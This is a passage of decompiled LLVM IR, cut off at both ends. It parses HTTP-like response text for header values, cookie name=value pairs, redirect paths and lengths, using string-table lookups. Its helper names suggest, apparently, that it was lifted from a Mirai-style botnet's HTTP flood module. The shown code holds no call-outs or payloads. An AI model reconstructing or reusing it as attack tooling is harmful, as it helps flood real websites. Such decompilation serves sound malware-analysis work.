  %stack_var_-132.0 = phi i32 [ %v8_a094, %dec_label_pc_a0ac ], [ %v1_a0d8, %dec_label_pc_a0d4 ]
  store i32 %v2_8260, i32* @lr, align 4
  %v2_a0fc = add i32 %v2_a074, %stack_var_-132.0
  %v3_a104 = inttoptr i32 %v2_a0fc to i8*
  store i8 0, i8* %v3_a104, align 1
  %v3_a10c = call i32 @util_strlen(i8* %v1_a084)
  store i32 %v3_a10c, i32* %r4.global-to-local, align 4
  %v3_a11c = call i8* @table_retrieve_val(i32 43, i32* null)
  %v0_a128 = load i32, i32* %r4.global-to-local, align 4
  %v7_a130 = call i32 @util_stristr(i8* %v1_a084, i32 %v0_a128, i8* %v3_a11c)
  %v2_a138 = icmp eq i32 %v7_a130, 0
  br i1 %v2_a138, label %dec_label_pc_a14c, label %dec_label_pc_a140

dec_label_pc_a140:                                ; preds = %dec_label_pc_a0e0
  store i32 1, i32* %v3_9fc8, align 4
  br label %dec_label_pc_a14c

dec_label_pc_a14c:                                ; preds = %dec_label_pc_a0e0, %dec_label_pc_a060, %dec_label_pc_9fc0, %dec_label_pc_a140
  %v2_a154 = add i32 %v2_9cb0, 1460
  %v3_a154 = inttoptr i32 %v2_a154 to i32*
  store i32 0, i32* %v3_a154, align 4
  %v3_a160 = call i8* @table_retrieve_val(i32 41, i32* null)
  %v7_a17c = call i32 @util_stristr(i8* %v3_8428, i32 %v4_9e78, i8* %v3_a160)
  %v7_a184 = icmp eq i32 %v7_a17c, -1
  br i1 %v7_a184, label %dec_label_pc_a2d8, label %dec_label_pc_a18c

dec_label_pc_a18c:                                ; preds = %dec_label_pc_a14c
  %v3_a194 = call i8* @table_retrieve_val(i32 41, i32* null)
  %v7_a1b0 = call i32 @util_stristr(i8* %v3_8428, i32 %v4_9e78, i8* %v3_a194)
  %v2_a1d0 = add i32 %v7_a1b0, %v3_8410
  %v1_a1d4 = inttoptr i32 %v2_a1d0 to i8*
  %v2_a1d4 = load i8, i8* %v1_a1d4, align 1
  %v7_a1d8 = icmp eq i8 %v2_a1d4, 32
  br i1 %v7_a1d8, label %dec_label_pc_a1e0, label %dec_label_pc_a1ec

dec_label_pc_a1e0:                                ; preds = %dec_label_pc_a18c
  %v1_a1e4 = add i32 %v7_a1b0, 1
  br label %dec_label_pc_a1ec

dec_label_pc_a1ec:                                ; preds = %dec_label_pc_a18c, %dec_label_pc_a1e0
  %stack_var_-124.0 = phi i32 [ %v1_a1e4, %dec_label_pc_a1e0 ], [ %v7_a1b0, %dec_label_pc_a18c ]
  %v2_a200 = add i32 %stack_var_-124.0, %v3_8410
  %v2_a20c = sub i32 %v4_9e78, %stack_var_-124.0
  %v1_a210 = inttoptr i32 %v2_a200 to i8*
  %v8_a220 = call i32 @util_memsearch(i8* %v1_a210, i32 %v2_a20c, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0), i32 2)
  %v4_a228 = inttoptr i32 %v8_a220 to i8*
  %v7_a230 = icmp eq i32 %v8_a220, -1
  br i1 %v7_a230, label %dec_label_pc_a2d8, label %dec_label_pc_a238

dec_label_pc_a238:                                ; preds = %dec_label_pc_a1ec
  %v8_a25c = icmp slt i8* %v4_a228, inttoptr (i32 2 to i8*)
  br i1 %v8_a25c, label %dec_label_pc_a26c, label %dec_label_pc_a260

dec_label_pc_a260:                                ; preds = %dec_label_pc_a238
  %v1_a264 = add i32 %v8_a220, -2
  %v4_a268 = inttoptr i32 %v1_a264 to i8*
  br label %dec_label_pc_a26c

dec_label_pc_a26c:                                ; preds = %dec_label_pc_a238, %dec_label_pc_a260
  %con_ptr_-120.0 = phi i8* [ %v4_a228, %dec_label_pc_a238 ], [ %v4_a268, %dec_label_pc_a260 ]
  %v4_a270 = ptrtoint i8* %con_ptr_-120.0 to i32
  %v2_a288 = add i32 %v2_a200, %v4_a270
  %v3_a290 = inttoptr i32 %v2_a288 to i8*
  store i8 0, i8* %v3_a290, align 1
  %v3_a298 = call i32 @util_strlen(i8* %v1_a210)
  store i32 %v3_a298, i32* %r4.global-to-local, align 4
  %v3_a2a8 = call i8* @table_retrieve_val(i32 42, i32* null)
  %v0_a2b4 = load i32, i32* %r4.global-to-local, align 4
  %v7_a2bc = call i32 @util_stristr(i8* %v1_a210, i32 %v0_a2b4, i8* %v3_a2a8)
  %v2_a2c4 = icmp eq i32 %v7_a2bc, 0
  br i1 %v2_a2c4, label %dec_label_pc_a2d8, label %dec_label_pc_a2cc

dec_label_pc_a2cc:                                ; preds = %dec_label_pc_a26c
  store i32 1, i32* %v3_a154, align 4
  br label %dec_label_pc_a2d8

dec_label_pc_a2d8:                                ; preds = %dec_label_pc_a26c, %dec_label_pc_a1ec, %dec_label_pc_a14c, %dec_label_pc_a2cc
  %v3_a2e0 = call i8* @table_retrieve_val(i32 40, i32* null)
  %v7_a300 = call i32 @util_stristr(i8* %v3_8428, i32 %v4_9e78, i8* %v3_a2e0)
  %v7_a308 = icmp eq i32 %v7_a300, -1
  br i1 %v7_a308, label %dec_label_pc_a434, label %dec_label_pc_a310

dec_label_pc_a310:                                ; preds = %dec_label_pc_a2d8
  %v3_a318 = call i8* @table_retrieve_val(i32 40, i32* null)
  %v7_a334 = call i32 @util_stristr(i8* %v3_8428, i32 %v4_9e78, i8* %v3_a318)
  store i32 %v2_8260, i32* @lr, align 4
  %v2_a354 = add i32 %v7_a334, %v3_8410
  %v1_a358 = inttoptr i32 %v2_a354 to i8*
  %v2_a358 = load i8, i8* %v1_a358, align 1
  %v7_a35c = icmp eq i8 %v2_a358, 32
  br i1 %v7_a35c, label %dec_label_pc_a364, label %dec_label_pc_a370

dec_label_pc_a364:                                ; preds = %dec_label_pc_a310
  %v1_a368 = add i32 %v7_a334, 1
  br label %dec_label_pc_a370

dec_label_pc_a370:                                ; preds = %dec_label_pc_a310, %dec_label_pc_a364
  %stack_var_-112.0 = phi i32 [ %v1_a368, %dec_label_pc_a364 ], [ %v7_a334, %dec_label_pc_a310 ]
  %v2_a384 = add i32 %stack_var_-112.0, %v3_8410
  %v2_a390 = sub i32 %v4_9e78, %stack_var_-112.0
  %v1_a394 = inttoptr i32 %v2_a384 to i8*
  %v8_a3a4 = call i32 @util_memsearch(i8* %v1_a394, i32 %v2_a390, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0), i32 2)
  %v4_a3ac = inttoptr i32 %v8_a3a4 to i8*
  %v7_a3b4 = icmp eq i32 %v8_a3a4, -1
  br i1 %v7_a3b4, label %dec_label_pc_a778.preheader, label %dec_label_pc_a3bc

dec_label_pc_a3bc:                                ; preds = %dec_label_pc_a370
  %v8_a3e0 = icmp slt i8* %v4_a3ac, inttoptr (i32 2 to i8*)
  br i1 %v8_a3e0, label %dec_label_pc_a3f0, label %dec_label_pc_a3e4

dec_label_pc_a3e4:                                ; preds = %dec_label_pc_a3bc
  %v1_a3e8 = add i32 %v8_a3a4, -2
  %v4_a3ec = inttoptr i32 %v1_a3e8 to i8*
  br label %dec_label_pc_a3f0

dec_label_pc_a3f0:                                ; preds = %dec_label_pc_a3bc, %dec_label_pc_a3e4
  %len_ptr_-108.0 = phi i8* [ %v4_a3ac, %dec_label_pc_a3bc ], [ %v4_a3ec, %dec_label_pc_a3e4 ]
  %v4_a3f4 = ptrtoint i8* %len_ptr_-108.0 to i32
  %v2_a40c = add i32 %v2_a384, %v4_a3f4
  %v3_a414 = inttoptr i32 %v2_a40c to i8*
  store i8 0, i8* %v3_a414, align 1
  %v4_a420 = call i32 @util_atoi(i8* %v1_a394, i32 10)
  %v2_a42c = add i32 %v2_9cb0, 1464
  %v3_a42c = inttoptr i32 %v2_a42c to i32*
  store i32 %v4_a420, i32* %v3_a42c, align 4
  br label %dec_label_pc_a778.preheader

dec_label_pc_a434:                                ; preds = %dec_label_pc_a2d8
  %v2_a43c = add i32 %v2_9cb0, 1464
  %v3_a43c = inttoptr i32 %v2_a43c to i32*
  store i32 0, i32* %v3_a43c, align 4
  br label %dec_label_pc_a778.preheader

dec_label_pc_a778.preheader:                      ; preds = %dec_label_pc_a370, %dec_label_pc_a3f0, %dec_label_pc_a434
  %v1_a7bc = add i32 %v2_9cb0, 1468
  %v2_a7bc = inttoptr i32 %v1_a7bc to i32*
  %v1_a6b8 = add i32 %v2_9cb0, 1472
  br label %dec_label_pc_a778

dec_label_pc_a44c:                                ; preds = %dec_label_pc_a7b8
  store i32 %v2_a788, i32* %r4.global-to-local, align 4
  %v3_a468 = call i8* @table_retrieve_val(i32 39, i32* null)
  %v0_a470 = load i32, i32* %r4.global-to-local, align 4
  %v1_a470 = inttoptr i32 %v0_a470 to i8*
  %v7_a47c = call i32 @util_stristr(i8* %v1_a470, i32 %v4_9e78, i8* %v3_a468)
  %v2_a490 = add i32 %v7_a47c, %storemerge26
  %v2_a4a4 = add i32 %v2_a490, %v3_8410
  %v1_a4a8 = inttoptr i32 %v2_a4a4 to i8*
  %v2_a4a8 = load i8, i8* %v1_a4a8, align 1
  %v7_a4ac = icmp eq i8 %v2_a4a8, 32
  br i1 %v7_a4ac, label %dec_label_pc_a4b4, label %dec_label_pc_a4c0

dec_label_pc_a4b4:                                ; preds = %dec_label_pc_a44c
  %v1_a4b8 = add i32 %v7_a47c, 1
  br label %dec_label_pc_a4c0

dec_label_pc_a4c0:                                ; preds = %dec_label_pc_a44c, %dec_label_pc_a4b4
  %stack_var_-100.0 = phi i32 [ %v1_a4b8, %dec_label_pc_a4b4 ], [ %v7_a47c, %dec_label_pc_a44c ]
  %v2_a4dc = add i32 %stack_var_-100.0, %v2_a788
  %v2_a4e8 = sub i32 %v4_9e78, %storemerge26
  %v2_a4f0 = sub i32 %v2_a4e8, %stack_var_-100.0
  %v1_a4f4 = inttoptr i32 %v2_a4dc to i8*
  %v8_a504 = call i32 @util_memsearch(i8* %v1_a4f4, i32 %v2_a4f0, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0), i32 2)
  %v4_a50c = inttoptr i32 %v8_a504 to i8*
  %v7_a514 = icmp eq i32 %v8_a504, -1
  %.pre = add i32 %stack_var_-100.0, %storemerge26
  br i1 %v7_a514, label %dec_label_pc_a768, label %dec_label_pc_a51c

dec_label_pc_a51c:                                ; preds = %dec_label_pc_a4c0
  %v2_a538 = add i32 %.pre, %v3_8410
  %v8_a548 = icmp slt i8* %v4_a50c, inttoptr (i32 2 to i8*)
  br i1 %v8_a548, label %dec_label_pc_a558, label %dec_label_pc_a54c

dec_label_pc_a54c:                                ; preds = %dec_label_pc_a51c
  %v1_a550 = add i32 %v8_a504, -2
  %v4_a554 = inttoptr i32 %v1_a550 to i8*
  br label %dec_label_pc_a558

dec_label_pc_a558:                                ; preds = %dec_label_pc_a51c, %dec_label_pc_a54c
  %cookie_ptr_-96.0 = phi i8* [ %v4_a50c, %dec_label_pc_a51c ], [ %v4_a554, %dec_label_pc_a54c ]
  %v8_a59c = call i32 @util_memsearch(i8* %v1_a4f4, i32 %v2_a4f0, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_22e14.51, i32 0, i32 0), i32 1)
  %tmp165 = icmp slt i32 %v8_a59c, 1
  br i1 %tmp165, label %dec_label_pc_a600, label %dec_label_pc_a5ac

dec_label_pc_a5ac:                                ; preds = %dec_label_pc_a558
  %v8_a5f0 = call i32 @util_memsearch(i8* %v1_a4f4, i32 %v2_a4f0, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_22e14.51, i32 0, i32 0), i32 1)
  %v1_a5f8 = add i32 %v8_a5f0, -1
  %v4_a5fc = inttoptr i32 %v1_a5f8 to i8*
  br label %dec_label_pc_a600

dec_label_pc_a600:                                ; preds = %dec_label_pc_a558, %dec_label_pc_a5ac
  %cookie_ptr_-96.1 = phi i8* [ %cookie_ptr_-96.0, %dec_label_pc_a558 ], [ %v4_a5fc, %dec_label_pc_a5ac ]
  %v4_a60c = ptrtoint i8* %cookie_ptr_-96.1 to i32
  store i32 %v2_8260, i32* @lr, align 4
  %v2_a624 = add i32 %v2_a538, %v4_a60c
  %v3_a62c = inttoptr i32 %v2_a624 to i8*
  store i8 0, i8* %v3_a62c, align 1
  %v4_a664 = inttoptr i32 %v2_a538 to i8*
  br label %dec_label_pc_a664

dec_label_pc_a63c:                                ; preds = %dec_label_pc_a664
  %v2_a648 = add i32 %v3_a670, %v2_a538
  %v1_a64c = inttoptr i32 %v2_a648 to i8*
  %v2_a64c = load i8, i8* %v1_a64c, align 1
  %v7_a650 = icmp eq i8 %v2_a64c, 61
  br i1 %v7_a650, label %dec_label_pc_a67c, label %dec_label_pc_a658

dec_label_pc_a658:                                ; preds = %dec_label_pc_a63c
  %v1_a65c = add i32 %v3_a670, 1
  br label %dec_label_pc_a664

dec_label_pc_a664:                                ; preds = %dec_label_pc_a600, %dec_label_pc_a658
  %storemerge30 = phi i32 [ 0, %dec_label_pc_a600 ], [ %v1_a65c, %dec_label_pc_a658 ]
  store i32 %storemerge30, i32* %i_-216, align 4
  %v3_a668 = call i32 @util_strlen(i8* %v4_a664)
  %v3_a670 = load i32, i32* %i_-216, align 4
  %v8_a678 = icmp sgt i32 %v3_a668, %v3_a670
  br i1 %v8_a678, label %dec_label_pc_a63c, label %dec_label_pc_a664.dec_label_pc_a67c_crit_edge

dec_label_pc_a664.dec_label_pc_a67c_crit_edge:    ; preds = %dec_label_pc_a664
  %.pre74 = add i32 %v3_a670, %v2_a538
  %.pre75 = inttoptr i32 %.pre74 to i8*
  br label %dec_label_pc_a67c

dec_label_pc_a67c:                                ; preds = %dec_label_pc_a63c, %dec_label_pc_a664.dec_label_pc_a67c_crit_edge
  %v1_a68c.pre-phi = phi i8* [ %.pre75, %dec_label_pc_a664.dec_label_pc_a67c_crit_edge ], [ %v1_a64c, %dec_label_pc_a63c ]
  %v2_a68c = load i8, i8* %v1_a68c.pre-phi, align 1
  %v7_a690 = icmp eq i8 %v2_a68c, 61
  br i1 %v7_a690, label %dec_label_pc_a698, label %dec_label_pc_a768

dec_label_pc_a698:                                ; preds = %dec_label_pc_a67c
  br label %dec_label_pc_a6fc

dec_label_pc_a6b4:                                ; preds = %dec_label_pc_a6fc
  %v3_a6c0 = mul i32 %v3_a6bc, 128
  %v2_a6c4 = add i32 %v3_a6c0, %v1_a6b8
  %v1_a6cc = inttoptr i32 %v2_a6c4 to i8*
  %v7_a6d4 = call i8 @util_strncmp(i8* %v4_a664, i8* %v1_a6cc, i32 %v3_a670)
  %v2_a6dc = icmp eq i8 %v7_a6d4, 0
  br i1 %v2_a6dc, label %dec_label_pc_a6f0, label %dec_label_pc_a710

dec_label_pc_a6f0:                                ; preds = %dec_label_pc_a6b4
  %v3_a6f0 = load i32, i32* %i_-216, align 4
  %v1_a6f4 = add i32 %v3_a6f0, 1
  br label %dec_label_pc_a6fc

dec_label_pc_a6fc:                                ; preds = %dec_label_pc_a698, %dec_label_pc_a6f0
  %v3_a6bc = phi i32 [ 0, %dec_label_pc_a698 ], [ %v1_a6f4, %dec_label_pc_a6f0 ]
  store i32 %v3_a6bc, i32* %i_-216, align 4
  %v3_a700 = load i32, i32* %v2_a7bc, align 4
  %v2_a708 = sub i32 %v3_a700, %v3_a6bc
  %v4_a708 = xor i32 %v3_a700, %v3_a6bc
  %v5_a708 = xor i32 %v2_a708, %v3_a700
  %v6_a708 = and i32 %v5_a708, %v4_a708
  %v7_a708 = icmp slt i32 %v6_a708, 0
  %v8_a708 = icmp slt i32 %v2_a708, 0
  %v9_a708 = icmp eq i32 %v3_a700, %v3_a6bc
  %v3_a70c = xor i1 %v8_a708, %v7_a708
  %v4_a70c = or i1 %v9_a708, %v3_a70c
  br i1 %v4_a70c, label %dec_label_pc_a71c, label %dec_label_pc_a6b4

dec_label_pc_a710:                                ; preds = %dec_label_pc_a6b4
  br label %dec_label_pc_a768

dec_label_pc_a71c:                                ; preds = %dec_label_pc_a6fc
  %v3_a720 = call i32 @util_strlen(i8* %v4_a664)
  %v8_a72c = icmp sgt i32 %v3_a720, 127
  br i1 %v8_a72c, label %dec_label_pc_a768, label %dec_label_pc_a730

dec_label_pc_a730:                                ; preds = %dec_label_pc_a71c
  %v3_a73c = load i32, i32* %v2_a7bc, align 4
  %v3_a740 = mul i32 %v3_a73c, 128
  %v2_a744 = add i32 %v3_a740, %v1_a6b8
  %v1_a748 = inttoptr i32 %v2_a744 to i8*
  %v6_a750 = call i32 @util_strcpy(i8* %v1_a748, i8* %v4_a664)
  %v3_a758 = load i32, i32* %v2_a7bc, align 4
  %v1_a75c = add i32 %v3_a758, 1
  store i32 %v1_a75c, i32* %v2_a7bc, align 4
  br label %dec_label_pc_a768

dec_label_pc_a768:                                ; preds = %dec_label_pc_a4c0, %dec_label_pc_a710, %dec_label_pc_a67c, %dec_label_pc_a71c, %dec_label_pc_a730
  br label %dec_label_pc_a778

dec_label_pc_a778:                                ; preds = %dec_label_pc_a778.preheader, %dec_label_pc_a768
  %storemerge26 = phi i32 [ %.pre, %dec_label_pc_a768 ], [ 0, %dec_label_pc_a778.preheader ]
  %v2_a788 = add i32 %storemerge26, %v3_8410
  store i32 %v2_a788, i32* @r4, align 4
  %v3_a794 = call i8* @table_retrieve_val(i32 39, i32* null)
  %v0_a79c = load i32, i32* @r4, align 4
  %v1_a79c = inttoptr i32 %v0_a79c to i8*
  %v7_a7a8 = call i32 @util_stristr(i8* %v1_a79c, i32 %v4_9e78, i8* %v3_a794)
  %v7_a7b0 = icmp eq i32 %v7_a7a8, -1
  br i1 %v7_a7b0, label %dec_label_pc_a7c8, label %dec_label_pc_a7b8

dec_label_pc_a7b8:                                ; preds = %dec_label_pc_a778
  %v3_a7bc = load i32, i32* %v2_a7bc, align 4
  %v1_a7c0 = add i32 %v3_a7bc, -4
  %v3_a7c0 = sub i32 3, %v3_a7bc
  %v4_a7c0 = and i32 %v3_a7c0, %v3_a7bc
  %v5_a7c0 = icmp slt i32 %v4_a7c0, 0
  %v6_a7c0 = icmp slt i32 %v1_a7c0, 0
  %v7_a7c0 = icmp eq i32 %v3_a7bc, 4
  %v3_a7c4 = xor i1 %v6_a7c0, %v5_a7c0
  %v4_a7c4 = or i1 %v7_a7c0, %v3_a7c4
  br i1 %v4_a7c4, label %dec_label_pc_a44c, label %dec_label_pc_a7c8

dec_label_pc_a7c8:                                ; preds = %dec_label_pc_a7b8, %dec_label_pc_a778
  %v3_a7d0 = call i8* @table_retrieve_val(i32 38, i32* null)
  %v7_a7f0 = call i32 @util_stristr(i8* %v3_8428, i32 %v4_9e78, i8* %v3_a7d0)
  %v7_a7f8 = icmp eq i32 %v7_a7f0, -1
  br i1 %v7_a7f8, label %dec_label_pc_ab64, label %dec_label_pc_a800

dec_label_pc_a800:                                ; preds = %dec_label_pc_a7c8
  %v3_a808 = call i8* @table_retrieve_val(i32 38, i32* null)
  %v7_a824 = call i32 @util_stristr(i8* %v3_8428, i32 %v4_9e78, i8* %v3_a808)
  %v2_a844 = add i32 %v7_a824, %v3_8410
  %v1_a848 = inttoptr i32 %v2_a844 to i8*
  %v2_a848 = load i8, i8* %v1_a848, align 1
  %v7_a84c = icmp eq i8 %v2_a848, 32
  br i1 %v7_a84c, label %dec_label_pc_a854, label %dec_label_pc_a860

dec_label_pc_a854:                                ; preds = %dec_label_pc_a800
  %v1_a858 = add i32 %v7_a824, 1
  br label %dec_label_pc_a860

dec_label_pc_a860:                                ; preds = %dec_label_pc_a800, %dec_label_pc_a854
  %stack_var_-80.0 = phi i32 [ %v1_a858, %dec_label_pc_a854 ], [ %v7_a824, %dec_label_pc_a800 ]
  %v2_a874 = add i32 %stack_var_-80.0, %v3_8410
  %v2_a880 = sub i32 %v4_9e78, %stack_var_-80.0
  %v1_a884 = inttoptr i32 %v2_a874 to i8*
  %v8_a894 = call i32 @util_memsearch(i8* %v1_a884, i32 %v2_a880, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0), i32 2)
  %v7_a8a4 = icmp eq i32 %v8_a894, -1
  br i1 %v7_a8a4, label %dec_label_pc_ab64, label %dec_label_pc_a8ac

dec_label_pc_a8ac:                                ; preds = %dec_label_pc_a860
  %v7_a8d0 = icmp slt i32 %v8_a894, 2
  br i1 %v7_a8d0, label %dec_label_pc_a8e0, label %dec_label_pc_a8d4

dec_label_pc_a8d4:                                ; preds = %dec_label_pc_a8ac
  %v1_a8d8 = add i32 %v8_a894, -2
  br label %dec_label_pc_a8e0

dec_label_pc_a8e0:                                ; preds = %dec_label_pc_a8ac, %dec_label_pc_a8d4
  %stack_var_-76.0 = phi i32 [ %v8_a894, %dec_label_pc_a8ac ], [ %v1_a8d8, %dec_label_pc_a8d4 ]
  %v2_a8fc = add i32 %v2_a874, %stack_var_-76.0
  %v3_a904 = inttoptr i32 %v2_a8fc to i8*
  store i8 0, i8* %v3_a904, align 1
  %v1_a90c = add i32 %stack_var_-76.0, 1
  %v9_a924 = call i32 @util_memsearch(i8* %v1_a884, i32 %v1_a90c, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22e18.53, i32 0, i32 0), i32 4)
  %v7_a92c = icmp eq i32 %v9_a924, 4
  br i1 %v7_a92c, label %dec_label_pc_a934, label %dec_label_pc_aabc

dec_label_pc_a934:                                ; preds = %dec_label_pc_a8e0
  store i32 7, i32* %i_-216, align 4
  %v1_a940 = add i32 %v2_a874, 4
  %v1_a944 = inttoptr i32 %v1_a940 to i8*
  %v2_a944 = load i8, i8* %v1_a944, align 1
  %v7_a948 = icmp eq i8 %v2_a944, 115
  br i1 %v7_a948, label %dec_label_pc_a950, label %dec_label_pc_a95c

dec_label_pc_a950:                                ; preds = %dec_label_pc_a934
  store i32 8, i32* %i_-216, align 4
  br label %dec_label_pc_a95c

dec_label_pc_a95c:                                ; preds = %dec_label_pc_a934, %dec_label_pc_a950
  %v3_a95c = phi i32 [ 7, %dec_label_pc_a934 ], [ 8, %dec_label_pc_a950 ]
  %v2_a968 = add i32 %v3_a95c, %v2_a874
  store i32 %v2_a968, i32* @r1, align 4
  %v2_a974 = sub i32 %v1_a90c, %v3_a95c
  store i32 %v2_a974, i32* @r3, align 4
  store i32 %v2_a874, i32* @r0, align 4
  store i32 %v2_a974, i32* @r2, align 4
  %v3_a980 = call i32 @memmove(i32 %v2_a874, i32 %v2_a968, i32 %v2_a974)
  store i32 0, i32* %i_-216, align 4
  %v2_a9e449 = load i8, i8* %v1_a884, align 1
  %v2_a9e851 = icmp eq i8 %v2_a9e449, 0
  br i1 %v2_a9e851, label %dec_label_pc_a9f0, label %dec_label_pc_a990

dec_label_pc_a990:                                ; preds = %dec_label_pc_a95c, %dec_label_pc_a9c8
  %v3_a9ac = phi i32 [ %v1_a9cc, %dec_label_pc_a9c8 ], [ 0, %dec_label_pc_a95c ]
  %v2_a99c = add i32 %v3_a9ac, %v2_a874
  %v1_a9a0 = inttoptr i32 %v2_a99c to i8*
  %v2_a9a0 = load i8, i8* %v1_a9a0, align 1
  %v7_a9a4 = icmp eq i8 %v2_a9a0, 47
  br i1 %v7_a9a4, label %dec_label_pc_a9ac, label %dec_label_pc_a9c8

dec_label_pc_a9ac:                                ; preds = %dec_label_pc_a990
  store i8 0, i8* %v1_a9a0, align 1
  br label %dec_label_pc_a9f0

dec_label_pc_a9c8:                                ; preds = %dec_label_pc_a990
  %v1_a9cc = add i32 %v3_a9ac, 1
  store i32 %v1_a9cc, i32* %i_-216, align 4
  %v2_a9e0 = add i32 %v1_a9cc, %v2_a874
  %v1_a9e4 = inttoptr i32 %v2_a9e0 to i8*
  %v2_a9e4 = load i8, i8* %v1_a9e4, align 1
  %v2_a9e8 = icmp eq i8 %v2_a9e4, 0
  br i1 %v2_a9e8, label %dec_label_pc_a9f0, label %dec_label_pc_a990

dec_label_pc_a9f0:                                ; preds = %dec_label_pc_a9c8, %dec_label_pc_a95c, %dec_label_pc_a9ac
  %v3_a9f4 = call i32 @util_strlen(i8* %v1_a884)
  %tmp166 = icmp slt i32 %v3_a9f4, 1
  br i1 %tmp166, label %dec_label_pc_aa30, label %dec_label_pc_aa04

dec_label_pc_aa04:                                ; preds = %dec_label_pc_a9f0
  %v3_aa08 = call i32 @util_strlen(i8* %v1_a884)
  %v8_aa14 = icmp sgt i32 %v3_aa08, 127
  br i1 %v8_aa14, label %dec_label_pc_aa30, label %dec_label_pc_aa18

dec_label_pc_aa18:                                ; preds = %dec_label_pc_aa04
  %v1_aa20 = add i32 %v2_9cb0, 789
  %v1_aa24 = inttoptr i32 %v1_aa20 to i8*
  %v6_aa2c = call i32 @util_strcpy(i8* %v1_aa24, i8* %v1_a884)
  br label %dec_label_pc_aa30

dec_label_pc_aa30:                                ; preds = %dec_label_pc_aa04, %dec_label_pc_a9f0, %dec_label_pc_aa18
  %v1_aa34 = add i32 %v2_a874, 1
  %v3_aa38 = load i32, i32* %i_-216, align 4
  %v2_aa3c = add i32 %v3_aa38, %v1_aa34
  %v1_aa40 = inttoptr i32 %v2_aa3c to i8*
  %v3_aa44 = call i32 @util_strlen(i8* %v1_aa40)
  %v8_aa50 = icmp sgt i32 %v3_aa44, 255
  br i1 %v8_aa50, label %dec_label_pc_ab54, label %dec_label_pc_aa54

dec_label_pc_aa54:                                ; preds = %dec_label_pc_aa30
  %v1_aa5c = add i32 %v2_9cb0, 533
  %v1_aa60 = inttoptr i32 %v1_aa5c to i8*
  call void @util_zero(i8* %v1_aa60, i32 255)
  %v3_aa74 = load i32, i32* %i_-216, align 4
  %v2_aa78 = add i32 %v3_aa74, %v1_aa34
  %v1_aa7c = inttoptr i32 %v2_aa78 to i8*
  %v3_aa80 = call i32 @util_strlen(i8* %v1_aa7c)
  %tmp167 = icmp slt i32 %v3_aa80, 1
  br i1 %tmp167, label %dec_label_pc_ab54, label %dec_label_pc_aa90

dec_label_pc_aa90:                                ; preds = %dec_label_pc_aa54
  %v3_aaa4 = load i32, i32* %i_-216, align 4
  %v2_aaa8 = add i32 %v3_aaa4, %v1_aa34
  %v1_aab0 = inttoptr i32 %v2_aaa8 to i8*
  %v6_aab4 = call i32 @util_strcpy(i8* %v1_aa60, i8* %v1_aab0)
  br label %dec_label_pc_ab54

dec_label_pc_aabc:                                ; preds = %dec_label_pc_a8e0
  %v2_aac0 = load i8, i8* %v1_a884, align 1
  %v7_aac4 = icmp eq i8 %v2_aac0, 47
  br i1 %v7_aac4, label %dec_label_pc_aacc, label %dec_label_pc_ab54

dec_label_pc_aacc:                                ; preds = %dec_label_pc_aabc
  %v1_aad4 = add i32 %v2_9cb0, 533
  %v1_aad8 = inttoptr i32 %v1_aad4 to i8*
  call void @util_zero(i8* %v1_aad8, i32 255)
  %v1_aae8 = add i32 %v2_a874, 1
  %v3_aaec = load i32, i32* %i_-216, align 4
  %v2_aaf0 = add i32 %v3_aaec, %v1_aae8
  %v1_aaf4 = inttoptr i32 %v2_aaf0 to i8*
  %v3_aaf8 = call i32 @util_strlen(i8* %v1_aaf4)
  %tmp168 = icmp slt i32 %v3_aaf8, 1
  br i1 %tmp168, label %dec_label_pc_ab54, label %dec_label_pc_ab08

dec_label_pc_ab08:                                ; preds = %dec_label_pc_aacc
  %v3_ab10 = load i32, i32* %i_-216, align 4
  %v2_ab14 = add i32 %v3_ab10, %v1_aae8
  %v1_ab18 = inttoptr i32 %v2_ab14 to i8*
  %v3_ab1c = call i32 @util_strlen(i8* %v1_ab18)
  %v8_ab28 = icmp sgt i32 %v3_ab1c, 255
  br i1 %v8_ab28, label %dec_label_pc_ab54, label %dec_label_pc_ab2c

dec_label_pc_ab2c:                                ; preds = %dec_label_pc_ab08
  %v3_ab40 = load i32, i32* %i_-216, align 4
  %v2_ab44 = add i32 %v3_ab40, %v1_aae8
  %v1_ab4c = inttoptr i32 %v2_ab44 to i8*
  %v6_ab50 = call i32 @util_strcpy(i8* %v1_aad8, i8* %v1_ab4c)
  br label %dec_label_pc_ab54

dec_label_pc_ab54:                                ; preds = %dec_label_pc_aabc, %dec_label_pc_ab08, %dec_label_pc_aacc, %dec_label_pc_aa54, %dec_label_pc_aa30, %dec_label_pc_aa90, %dec_label_pc_ab2c
  store i8 1, i8* %v2_9e24, align 1
  br label %dec_label_pc_ba58

dec_label_pc_ab64:                                ; preds = %dec_label_pc_a860, %dec_label_pc_a7c8
  %v3_ab6c = call i8* @table_retrieve_val(i32 37, i32* null)
  %v7_ab8c = call i32 @util_stristr(i8* %v3_8428, i32 %v4_9e78, i8* %v3_ab6c)
  %v7_ab94 = icmp eq i32 %v7_ab8c, -1
  br i1 %v7_ab94, label %dec_label_pc_b1c8, label %dec_label_pc_ab9c

dec_label_pc_ab9c:                                ; preds = %dec_label_pc_ab64
  %v3_aba4 = call i8* @table_retrieve_val(i32 37, i32* null)
  %v7_abc0 = call i32 @util_stristr(i8* %v3_8428, i32 %v4_9e78, i8* %v3_aba4)
  store i32 %v2_8260, i32* @lr, align 4
  %v2_abe0 = add i32 %v7_abc0, %v3_8410
  %v1_abe4 = inttoptr i32 %v2_abe0 to i8*
  %v2_abe4 = load i8, i8* %v1_abe4, align 1
  %v7_abe8 = icmp eq i8 %v2_abe4, 32
  br i1 %v7_abe8, label %dec_label_pc_abf0, label %dec_label_pc_abfc

dec_label_pc_abf0:                                ; preds = %dec_label_pc_ab9c
  %v1_abf4 = add i32 %v7_abc0, 1
  br label %dec_label_pc_abfc

dec_label_pc_abfc:                                ; preds = %dec_label_pc_ab9c, %dec_label_pc_abf0
  %nl_off_-68.0 = phi i32 [ %v1_abf4, %dec_label_pc_abf0 ], [ %v7_abc0, %dec_label_pc_ab9c ]
  %v2_ac10 = add i32 %nl_off_-68.0, %v3_8410
  %v2_ac1c = sub i32 %v4_9e78, %nl_off_-68.0
